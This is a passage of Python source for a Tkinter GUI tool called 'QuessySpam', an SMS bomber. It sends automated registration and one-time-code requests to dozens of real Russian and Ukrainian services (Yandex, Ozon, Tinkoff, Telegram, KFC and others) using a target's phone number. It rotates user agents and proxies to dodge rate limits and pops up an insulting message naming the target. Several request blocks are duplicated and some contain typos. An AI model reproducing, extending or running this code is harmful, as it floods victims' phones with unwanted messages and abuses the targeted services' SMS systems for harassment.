               requests.post("https://eda.yandex/api/v1/user/request_authentication_code", data={'phone_number':_phone}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
               logs.insert('insert', '\n[+] Yandex Eda Отправлено!')
            except:
               logs.insert('insert', '\n[-] Yandex Eda Не отправлено!')
               
            try:
               requests.post("https://api.chef.yandex/api/v2/auth/sms", data={'phone_number':'+_phone'}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
               logs.insert('insert', '\n[+] Yandex Chef Отправлено!')
            except:
               logs.insert('insert', '\n[-] Yandex Chef Не отправлено!')
               
            try:
               requests.post("https://register.sipnet.ru/cgi-bin/exchange.dll/RegisterHelper?phone="+_phone+"&callmode=1&oper=9")
               logs.insert('insert', '\n[+] Sipnet Отправлено!')
            except:
               logs.insert('insert', '\n[-] Sipnet Не отправлено!')
               
            try:
               requests.post("https://www.ozon.ru/api/composer-api.bx/_action/fastEntry", data={'phone':_phone,'otpId':0}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
               logs.insert('insert', '\n[+] Ozon Отправлено!')
            except:
               logs.insert('insert', '\n[-] Ozon Не отправлено!')
               
            try:
               requests.post("https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru", data={'phone_number':_phone}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
               logs.insert('insert', '\n[+] Tinder Отправлено!')
            except:
               logs.insert('insert', '\n[-] Tinder Не отправлено!')
               
            try:
               requests.post("https://city24.ua/personalaccount/account/registration", data={'PhoneNumber':_phone}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
               logs.insert('insert', '\n[+] City24 Отправлено!')
            except:
               logs.insert('insert', '\n[-] City24 Не отправлено!')
               
            try:
               requests.post("https://auth.multiplex.ua/login", json={'login':_phone}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
               logs.insert('insert', '\n[+] Multiplex Отправлено!')
            except:
               logs.insert('insert', '\n[-] Multiplex Не отправлено!')
            try:
            	requests.post('https://p.grabtaxi.com/api/passenger/v2/profiles/register', data={'phoneNumber': _phone,'countryCode': 'ID','name': 'test','email': 'mail@mail.com','deviceToken': '*'}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
            	logs.insert('insert', '\n[+] GrabTaxi Отправлено!')
            except:
            	logs.insert('insert', '\n[-] GrabTaxi Не отправлено!')

            try:
            	requests.post('https://moscow.rutaxi.ru/ajax_keycode.html', data={'l': _phone9}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy)).json()["res"]
            	logs.insert('insert', '\n[+] RuTaxi Отправлено!')
            except:
            	logs.insert('insert', '\n[-] RuTaxi Не отправлено!')

            try:
            	requests.post('https://belkacar.ru/get-confirmation-code', data={'phone': _phone}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
            	logs.insert('insert', '\n[+] BelkaCar Отправлено!')
            except:
            	logs.insert('insert', '\n[-] BelkaCar Не отправлено!')

            try:
            	requests.post('https://api.tinkoff.ru/v1/sign_up', data={'phone': '+'+_phone}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
            	logs.insert('insert', '\n[+] Tinkoff Отправлено!')
            except:
            	logs.insert('insert', '\n[-] Tinkoff Не отправлено!')

            try:
            	requests.post('https://api.mtstv.ru/v1/users', json={'msisdn': _phone}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
            	logs.insert('insert', '\n[+] MTS TV Отправлено!')
            except:
            	logs.insert('insert', '\n[-] MTS TV Не отправлено!')

            try:
            	requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
            	logs.insert('insert', '\n[+] Youla Отправлено!')
            except:
            	logs.insert('insert', '\n[-] Youla Не отправлено!')

            try:
            	requests.post('https://pizzahut.ru/account/password-reset', data={'reset_by':'phone', 'action_id':'pass-recovery', 'phone': _phonePizzahut, '_token':'*'}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
            	logs.insert('insert', '\n[+] PizzaHut Отправлено!')
            except:
            	logs.insert('insert', '\n[-] PizzaHut Не отправлено!')

            try:
            	requests.post('https://www.rabota.ru/remind', data={'credential': _phone}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
            	logs.insert('insert', '\n[+] Rabota.ru Отправлено!')
            except:
            	logs.insert('insert', '\n[-] Rabota.ru Не отправлено!')

            try:
            	requests.post('https://www.smsint.ru/bitrix/templates/sms_intel/include/ajaxRegistrationTrigger.php', data={'name': _name,'phone': _phone, 'promo': 'yellowforma'}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
            	logs.insert('insert', '\n[+] SMSINT Отправлено!')
            except:
            	logs.insert('insert', '\n[-] SMSINT Не отправлено!')
            	
            try:
            	requests.post('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCodeForOtp', params={'pageName': 'loginByUserPhoneVerification', 'fromCheckout': 'false','fromRegisterPage': 'true','snLogin': '','bpg': '','snProviderId': ''}, data={'phone': _phone,'g-recaptcha-response': '','recaptcha': 'on'}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
            	logs.insert('insert', '\n[+] MVideo Отправлено!')
            except:
            	logs.insert('insert', '\n[-] MVideo Не отправлено!')

            try:
            	requests.post('https://newnext.ru/graphql', json={'operationName': 'registration', 'variables': {'client': {'firstName': 'Иван', 'lastName': 'Иванов', 'phone': _phone,'typeKeys': ['Unemployed']},'query': 'mutation registration($client: ClientInput!) {''\n  registration(client: $client) {''\n    token\n    __typename\n  }\n}\n'}}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
            	logs.insert('insert', '\n[+] NewNext Отправлено!')
            except:
            	logs.insert('insert', '\n[-] NewNext Не отправлено!')

            try:
            	requests.post('https://api.sunlight.net/v3/customers/authorization/', data={'phone': _phone}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
            	logs.insert('insert', '\n[+] SunLight Отправлено!')
            except:
            	logs.insert('insert', '\n[-] SunLight Не отправлено!')

            try:
            	requests.post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/', json={'client_type': 'personal', 'email': '_email', 'mobile_phone': _phone, 'deliveryOption': 'sms'}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
            	logs.insert('insert', '\n[+] ALPARI Отправлено!')
            except:
            	logs.insert('insert', '\n[-] ALPARI Не отправлено!')

            try:
            	requests.post('https://lk.invitro.ru/lk2/lka/patient/refreshCode', data={'phone': _phone}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
            	logs.insert('insert', '\n[+] INVITRO Отправлено!')
            except:
            	logs.insert('insert', '\n[-] INVITRO Не отправлено!')

            try:
            	requests.post('https://online.sbis.ru/reg/service/', json={'jsonrpc':'2.0','protocol':'5','method':'Пользователь.ЗаявкаНаФизика','params':{'phone':_phone},'id':'1'}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
            	logs.insert('insert', '\n[+] SBIS Отправлено!')
            except:
            	logs.insert('insert', '\n[-] SBIS Не отправлено!')

            try:
            	requests.post('https://ib.psbank.ru/api/authentication/extendedClientAuthRequest', json={'firstName':'Иван','middleName':'Иванович','lastName':'Иванов','sex':'1','birthDate':'10.10.2000','mobilePhone': _phone9,'russianFederationResident':'true','isDSA':'false','personalDataProcessingAgreement':'true','bKIRequestAgreement':'null','promotionAgreement':'true'}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
            	logs.insert('insert', '\n[+] PSBank Отправлено!')
            except:
            	logs.insert('insert', '\n[-] PSBank Не отправлено!')

            try:
            	requests.post('https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru', data={'phone': _phone}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
            	logs.insert('insert', '\n[+] BELTELECOM3 Отправлено!')
            except:
            	logs.insert('insert', '\n[-] BELTELECOM3 Не отправлено!')
            	
            try:
            	requests.post('https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms', json={'phone': '+' + _phone}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
            	logs.insert('insert', '\n[+] KFC Отправлено!')
            except:
            	logs.insert('insert', '\n[-] KFC Не отправлено!')

            try:
            	requests.post("https://api.carsmile.com/",json={"operationName": "enterPhone", "variables": {"phone": _phone},"query": "mutation enterPhone($phone: String!) {\n  enterPhone(phone: $phone)\n}\n"}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
            	logs.insert('insert', '\n[+] CARSMAIL Отправлено!')
            except:
            	logs.insert('insert', '\n[-] CARSMAIL Не отправлено!')

            try:
            	requests.post('https://www.citilink.ru/registration/confirm/phone/+' + _phone + '/')
            	logs.insert('insert', '\n[+] CITILINK Отправлено!')
            except:
            	logs.insert('insert', '\n[-] CITILINK Не отправлено!')

            try:
            	requests.post("https://api.delitime.ru/api/v2/signup",data={"SignupForm[username]": _phone, "SignupForm[device_type]": 3}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
            	logs.insert('insert', '\n[+] DELIMOBILE Отправлено!')
            except:
            	logs.insert('insert', '\n[-] DELIMOBILE Не отправлено!')

            try:
            	requests.get('https://findclone.ru/register', params={'phone': '+' + _phone}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
            	logs.insert('insert', '\n[+] FindClone Отправлено!')
            except:
            	logs.insert('insert', '\n[-] FindClone Не отправлено!')

            try:
            	requests.post("https://guru.taxi/api/v1/driver/session/verify",json={"phone": {"code": 1, "number": _phone}}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
            	logs.insert('insert', '\n[+] GuruTaxi Отправлено!')
            except:
            	logs.insert('insert', '\n[-] GuruTaxi Не отправлено!')

            try:
            	requests.post('https://www.icq.com/smsreg/requestPhoneValidation.php',data={'msisdn': _phone, "locale": 'en', 'countryCode': 'ru','version': '1', "k": "ic1rtwz1s1Hj1O0r", "r": "46763"}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
            	logs.insert('insert', '\n[+] ICQ Отправлено!')
            except:
            	logs.insert('insert', '\n[-] ICQ Не отправлено!')

            try:
            	requests.post("https://terra-1.indriverapp.com/api/authorization?locale=ru",data={"mode": "request", "phone": "+" + _phone,"phone_permission": "unknown", "stream_id": 0, "v": 3, "appversion": "3.20.6","osversion": "unknown", "devicemodel": "unknown"}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
            	logs.insert('insert', '\n[+] INDTIVERAPP Отправлено!')
            except:
            	logs.insert('insert', '\n[-] INDRIVERAPP Не отправлено!')
            	
            try:
            	requests.post("https://api.ivi.ru/mobileapi/user/register/phone/v6",data={"phone": _phone}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
            	logs.insert('insert', '\n[+] Ivi.ru Отправлено!')
            except:
            	logs.insert('insert', '\n[-] Ivi.ru Не отправлено!')

            try:
            	requests.post('https://lenta.com/api/v1/authentication/requestValidationCode',json={'phone':_phone}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
            	logs.insert('insert', '\n[+] Lenta Отправлено!')
            except:
            	logs.insert('insert', '\n[-] Lenta Не отправлено!')

            try:
            	requests.post('https://cloud.mail.ru/api/v2/notify/applink',json={'phone': _phone, 'api': 2, 'email': 'email','x-email': 'x-email'}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
            	logs.insert('insert', '\n[+] Cloud.mail Отправлено!')
            except:
            	logs.insert('insert', '\n[-] Cloud.mail Не отправлено!')

            try:
            	requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",data={"st.r.phone": "+" + _phone}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
            	logs.insert('insert', '\n[+] OK.RU Отправлено!')
            except:
            	logs.insert('insert', '\n[-] OK.RU Не отправлено!')
            	
            try:
            	requests.post("https://api.hmara.tv/stable/entrance", data={"contact": _phone}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
            	logs.insert('insert', '\n[+] Hmara.TV Отправлено!')
            except:            
            	logs.insert('insert', '\n[-] Hmara.TV Не отправлено!')
            	
            try:
            	requests.post("https://client-api.sushi-master.ru/api/v1/auth/init",json={"phone": _phone}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
            	logs.insert('insert', '\n[+] Sushi-Master Отправлено!')
            except:
            	logs.insert('insert', '\n[-] Sushi-Master Не отправлено!')
            	
            try:
            	requests.post("https://msk.tele2.ru/api/validation/number", _phone, json={"sender": "Tele2"}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
            	logs.insert('insert', '\n[+] Tele2 Отправлено!')
            except:
            	logs.insert('insert', '\n[-] Tele2 Не отправлено!')
              
            try:
            	requests.post("https://m.sportmaster.ru/user/session/SendSMSReg", params={"phone": _phone}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
            	logs.insert('insert', '\n[+] SportMaster Отправлено!')
            except:
            	logs.insert('insert', '\n[-] SportMaster Не отправлено!')
              
            try:
            	requests.post("https://my.telegram.org/auth/send_password", data={"phone" :_phone}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
            	logs.insert('insert', '\n[+] Telegram Отправлено!')
            except:
                logs.insert('insert', '\n[-] Telegram Не отправлено!')
                
            try:
            	requests.post("https://www.finam.ru/api/smslocker/sendcode", data={"phone" :_phone}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
            	logs.insert('insert', '\n[+] Finam.ru Отправлено!')
            except:
            	logs.insert('insert', '\n[-] Finam.ru Не отправлено!')
            	
            try:
            	requests.post("https://api.imgur.com/account/v1/phones/verify", data={"phone_number":_phone,"region_code":"RU"}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
            	logs.insert('insert', '\n[+] Imgur Отправлено!')
            except:
            	logs.insert('insert', '\n[-] Imgur Не отправлено!')
              
            try:
              requests.post("https://www.monobank.com.ua/api/mobapplink/send", data={'phone':_phone}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
              logs.insert('insert', '\n[+] MonoBank Отправлено!')
            except:
              logs.insert('insert', '\n[-] MonoBank Не отправлено!')
              
            try:
               requests.post("https://account.my.games/signup_send_sms/", data={'phone':_phone}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
               logs.insert('insert', '\n[+] My Games Отправлено!')
            except:
               logs.insert('insert', '\n[-] My Games Не отправлено!')
              
            try:
               requests.post("https://www.moyo.ua/identity/registration", data={'phone':_phone,'firstname':'Иван','email':'mail@mail.com'}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
               logs.insert('insert', '\n[+] Moyo Отправлено!')
            except:
               logs.insert('insert', '\n[-] Moyo Не отправлено!')
               
            try:
               requests.post("https://secure.online.ua/ajax/check_phone?reg_phone="+_phone+"")
               logs.insert('insert', '\n[+] Secure.online Отправлено!')
            except:
               logs.insert('insert', '\n[-] Secure.online Не отправлено!')
               
            try:
               requests.post("https://piroginomerodin.ru/index.php?route=sms/login/sendreg", data={'telephone':_phone}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
               logs.insert('insert', '\n[+] PirogiNomerOdin Отправлено!')
            except:
               logs.insert('insert', '\n[-] PirogiNomerOdin Не отправлено!')
               
            try:
               requests.post("https://cabinet.planetakino.ua/service/sms?phone="+_phone+"")
               logs.insert('insert', '\n[+] PlanetaKino Отправлено!')
            except:
               logs.insert('insert', '\n[-] PlanetaKino Не отправлено!')
               
            try:
               requests.post("https://pizzasinizza.ru/api/phoneCode.php", data={'phone':_phone}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
               logs.insert('insert', '\n[+] PizzaSinizza Отправлено!')
            except:
               logs.insert('insert', '\n[-] PizzaSinizza Не отправлено!')
               
            try:
               requests.post("https://richfamily.ru/ajax/sms_activities/sms_validate_phone.php", data={'phone':_phone}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
               logs.insert('insert', '\n[+] RichFamily Отправлено!')
            except:
               logs.insert('insert', '\n[-] RichFamily Не отправлено!')
               
            try:
               requests.post("https://www.prosushi.ru/php/profile.php", data={'phone':_phone,'mode':'sms'}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
               logs.insert('insert', '\n[+] ProSushi Отправленo!')
            except:
               logs.insert('insert', '\n[-] ProSushi Не отправлено!')
               
            try:
               requests.post("https://www.sms4b.ru/bitrix/components/sms4b/sms.demo/ajax.php", data={'demo_number':_phone,'ajax_demo_send':'1'}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
               logs.insert('insert', '\n[+] SMS4b Отправлено!')
            except:
               logs.insert('insert', '\n[-] SMS4b Не отправлено!')
               
            try:
               requests.post("https://kasta.ua/api/v2/login/", data={'phone':_phone}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
               logs.insert('insert', '\n[+] Kasta Отправлено!')
            except:
               logs.insert('insert', '\n[-] Kasta Не отправлено!')
               
            try:
               requests.post("https://app.benzuber.ru/login", data={'phone':_phone}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
               logs.insert('insert', '\n[+] Benzuber Отправлено!')
            except:
               logs.insert('insert', '\n[-] Benzuber Не отправлено!')
               
            try:
               requests.post("https://bamper.by/registration/?step=1", data={'phone': _phone, 'submit': 'Запросить смс подтверждения', 'rules': 'on'}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
               logs.insert('insert', '\n[+] Bamper Отправлено!')
            except:
               logs.insert('insert', '\n[-] Bamper Не отправлено!')
               
            try:
               requests.post("https://eda.yandex/api/v1/user/request_authentication_code", data={'phone_number':_phone}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
               logs.insert('insert', '\n[+] Yandex Eda Отправлено!')
            except:
               logs.insert('insert', '\n[-] Yandex Eda Не отправлено!')
               
            try:
               requests.post("https://api.chef.yandex/api/v2/auth/sms", data={'phone_number':'+_phone'}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
               logs.insert('insert', '\n[+] Yandex Chef Отправлено!')
            except:
               logs.insert('insert', '\n[-] Yandex Chef Не отправлено!')
               
            try:
               requests.post("https://register.sipnet.ru/cgi-bin/exchange.dll/RegisterHelper?phone="+_phone+"&callmode=1&oper=9")
               logs.insert('insert', '\n[+] Sipnet Отправлено!')
            except:
               logs.insert('insert', '\n[-] Sipnet Не отправлено!')
               
            try:
               requests.post("https://www.ozon.ru/api/composer-api.bx/_action/fastEntry", data={'phone':_phone,'otpId':0}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
               logs.insert('insert', '\n[+] Ozon Отправлено!')
            except:
               logs.insert('insert', '\n[-] Ozon Не отправлено!')
               
            try:
               requests.post("https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru", data={'phone_number':_phone}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
               logs.insert('insert', '\n[+] Tinder Отправлено!')
            except:
               logs.insert('insert', '\n[-] Tinder Не отправлено!')
               
            try:
               requests.post("https://city24.ua/personalaccount/account/registration", data={'PhoneNumber':_phone}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
               logs.insert('insert', '\n[+] City24 Отправлено!')
            except:
               logs.insert('insert', '\n[-] City24 Не отправлено!')
               
            try:
               requests.post("https://auth.multiplex.ua/login", json={'login':_phone}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
               logs.insert('insert', '\n[+] Multiplex Отправлено!')
            except:
               logs.insert('insert', '\n[-] Multiplex Не отправлено!')
               
            try:
               requests.post("https://yaponchik.net/login/login.php", data={'login': 'Y','countdown': '0','step': _phone,'redirect': '/profile/','phone':_phone, 'code':''}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
               logs.insert('insert', '\n[+] Yaponchik Отправлено!')
            except:
               logs.insert('insert', '\n[-] Yaponchik Не отправлено!')
               
            try:
               requests.post("https://api.iconjob.co/api/auth/verification_code",json={'phone':_phone}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
               logs.insert('insert', '\n[+] IconJob Отправлено!')
            except:
               logs.insert('insert', '\n[-] IconJob Не отправлено!')
               
            try:
               requests.post("https://ng-api.webbankir.com/user/v2/create", json={'lastName':'Луманов','firstName':'Сергей','middleName':'Иванович',"mobilePhone":_phone,"email":'_email','smsCode':''}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
               logs.insert('insert', '\n[+] WebBankir Отправлено!')
            except:
               logs.insert('insert', '\n[-] WebBankir Не отправлено!')
               
            try:
               requests.post("https://shop.vsk.ru/ajax/auth/postSms/", data={'phone':_phone}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
               logs.insert('insert', '\n[+] Shop vsk Отправлено!')
            except:
               logs.insert('insert', '\n[-] Shop vsk Не отправлено!')
               
            try:
               requests.post("https://thehive.pro/auth/signup", json={'phone':_phone}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
               logs.insert('insert', '\n[+] Thehive Отправлено!')
            except:
               logs.insert('insert', '\n[-] Thehive Не отправлено!')
               
            try:
               requests.post("https://www.taxi-ritm.ru/ajax/ppp/ppp_back_call.php", data={'RECALL': 'Y', 'BACK_CALL_PHONE': _phone}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
               logs.insert('insert', '\n[+] Taxi-Ritm Отправлено!')
            except:
               logs.insert('insert', '\n[-] Taxi-Ritm Не отправлено!')
               
            try:
               requests.post("https://lk.tabris.ru/reg/", data={'action':'phone', 'phone': _phone}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
               logs.insert('insert', '\n[+] Tabris Отправлено!')
            except:
               logs.insert('insert', '\n[-] Tabris Не отправлено!')
               
            try:
               requests.get("https://suandshi.ru/mobile_api/register_mobile_user", params={"phone": _phone}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
               logs.insert('insert', '\n[+] Suandshi Отправлено!')
            except:
               logs.insert('insert', '\n[-] Suandshi Не отправлено!')
               
            try:
               requests.post("https://alfalife.cc/auth.php", data={'phone': _phone}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
               logs.insert('insert', '\n[+] AlfaLife Отправлено!')
            except:
               logs.insert('insert', '\n[-] AlfaLife Не отправлено!')
               
            try:
               requests.post("https://shopandshow.ru/sms/password-request/",data={"phone": _phone, 'resend': 0}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
               logs.insert('insert', '\n[+] Shop And Show Отправлено!')
            except:
               logs.insert('insert', '\n[-] Shop And Show Не отправлено!')
               
            try:
               requests.post("https://pizzakazan.com/auth/ajax.php", data={'phone': _phone, 'method': 'sendCode'}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
               logs.insert('insert', '\n[+] PizzaKazan Отправлено!')
            except:
               logs.insert('insert', '\n[-] PizzaKazan Не отправлено!')
               
            try:
               requests.post('https://plink.tech/register/',json={'phone': _phone}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
               logs.insert('insert', '\n[+] Plink отправлено!')
            except:
               logs.insert('insert', '\n[-] Plink Не отправлено!')
               
            try:
               requests.post("https://qlean.ru/clients-api/v2/sms_codes/auth/request_code", json={'phone': _phone}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
               logs.insert('insert', '\n[+] qlean отправлено!')
            except:
               logs.insert('insert', '\n[-] qlean Не отправлено!')
               
            try:
               requests.post("http://smsgorod.ru/sendsms.php",data={"number": _phone}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
               logs.insert('insert', '\n[+] SMSgorod отправлено!')
            except:
               logs.insert('insert', '\n[-] SMSgorod Не отправлено!')
               
            try:
               requests.post('https://passport.twitch.tv/register?trusted_request=true',json={"birthday": {"day": 11, "month": 11, "year": 1999},"client_id": "kd1unb4b3q4t58fwlpcbzcbnm76a8fp", "include_verification_code": True,"password": password, "phone_number": _phone,"username": username}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
               logs.insert('insert', '\n[+] Twitch отправлено!')
            except:
               logs.insert('insert', '\n[-] Twich Не отправлено!')
            
            try:
               requests.post("https://api.wowworks.ru/v2/site/send-code",json={"phone": _phone, "type": 2}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
               logs.insert('insert', '\n[+] Wowworks отправлено!')
            except:
               logs.insert('insert', '\n[-] Wowworks Не отправлено!')
               
            try:
               requests.post("https://www.delivery-club.ru/ajax/user_otp", data={"phone": _phone}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
               logs.insert('insert', '\n[+] Delivery отправлено!')
            except:
               logs.insert('insert', '\n[-] Delivery Не отправлено!')
               
            try:
               requests.post("https://mobileplanet.ua/register", data={"klient_name": name,"klient_phone": _phone,"klient_email": _email}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
               print(Fore.GREN + '[+] MobilePlanet Отправлено!')
            except:
               logs.insert('insert', '\n[-] MobilePlanet Не отправлено!')
               
            try:
               requests.post("https://pampik.com/callback", data={'phoneCallback':_phone}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
               logs.insert('insert', '\n[+] Pampik Отправлено!')
            except:
               logs.insert('insert', '\n[-] Pampik Не отправлено!')
               
            try:
               requests.post("https://my.dianet.com.ua/send_sms/", data={'phone':_phone}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
               logs.insert('insert', '\n[+] Dianet Отправлено!')
            except:
               logs.insert('insert', '\n[-] Dianet Не отправлено!')
               
            try:
               requests.post("https://api.easypay.ua/api/auth/register", data={'phone':_phone,'password':'_password'}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
               logs.insert('insert', '\n[+] EazyPay Отправлено!')
            except:
               logs.insert('insert', '\n[-] EazyPay Не отправлено!')
               
            try:
               requests.post("https://fix-price.ru/ajax/register_phone_code.php", data={'phone':_phone,'action':'getCode','register_call':'Y'}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
               logs.insert('insert', '\n[+] Fix-Price Отправлено!')
            except:
               logs.insert('insert', '\n[-] Fix-Price Не отправлено!')
               
            try:
               requests.post("https://foodband.ru/api?phone="+_phone+"&call=customers/sendVerificationCode&g-recaptcha-response=")
               logs.insert('insert', '\n[+] FoodBand Отправлено!')
            except:
               logs.insert('insert', '\n[-] FoodBand Не отправлено!')
               
            try:
               requests.post("https://oapi.raiffeisen.ru/api/sms-auth/public/v1.0/phone/code?number="+_phone+"")
               logs.insert('insert', '\n[+] oapi Отправлено!')
            except:
               logs.insert('insert', '\n[-] oapi Не отправлено!')
               
            try:
               requests.post("https://rieltor.ua/api/users/register-sms/", data={'phone':'%phone%','retry':0}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
               logs.insert('insert', '\n[+] Rieltor Отправлено!')
            except:
               logs.insert('insert', '\n[-] Rieltor Не отправлено!')
               
            try:
               requests.post("https://vezitaxi.com/api/employment/getsmscode?phone=+_phone&city=561&callback=jsonp_callback_35979")
               logs.insert('insert', '\n[+] VeziTaxi Отправлено!')
            except:
               logs.insert('insert', '\n[-] VeziTaxi Не отправлено!')
               
            try:
               requests.post("https://tehnosvit.ua/iwantring_feedback.html", data={'feedbackName':_name,'feedbackPhone':_phone}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
               logs.insert('insert', '\n[+] TehnoSvit Отправлено!')
            except:
               logs.insert('insert', '\n[-] TehnoSvit Не отправлено!')
               
            try:
               requests.post("https://my.citrus.ua/api/v2/register", data={'email':email,'name':_name,'phone':_phone,'password':'!@#qwe','confirm_passwor':'!@#qwe'}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
               logs.insert('insert', '\n[+] Citrus Отправлено!')
            except:
               logs.insert('insert', '\n[-] Citrus Не отправлено!')
               
            try:
               requests.post("https://rutube.ru/api/accounts/sendpass/phone", data={"phone": "+" +_phone}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
               logs.insert('insert', '\n[+] Rutube Отправлено!')
            except:
               requests.post('https://www.citilink.ru/registration/confirm/phone/+'+_phone+'/')
            logs.insert('insert', '\n[+] Citilink Oтправлено!')
               
            try:
               requests.post("https://api-prime.anytime.global/api/v2/auth/sendVerificationCode",data={"phone": _phone}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
               logs.insert('insert', '\n[+] AnyTime Отправлено!')
            except:
               logs.insert('insert', '\n[-] AnyTime Hе отправлено!')

class News:
    def __init__(self):
        self.url = 'http://f0502358.xsph.ru/news'
    def start(self):
        try:
            r = requests.get(self.url)
            news = r.text
            logs.insert('insert', news)
        except:
            logs.insert('insert', '\n[-] Error of parsing news')


def flud():
    _phone = e1.get()
    mb.showinfo(title="QuessySpam", message="Fucking " + _phone + "!")
    tututu = threading.Thread(target=burjui)
    tututu.start()

def burjui():
    _phone = e1.get()
    SMSAttack(_phone = _phone, proxy = proxV).start()

def onProxyClick():
    if var.get() == True:
        proxV = True
    else:
        proxV = False

global proxV

proxV = False

var = BooleanVar()

cb = Checkbutton(root,
    text = 'Прокси', 
    font = ("Segoe Script", "16"),
    bg = '#1c0f1a',
    fg = '#f216ce',
    variable=var,
    command=onProxyClick)
cb.pack()
cb.place(x = 155, y = 67)

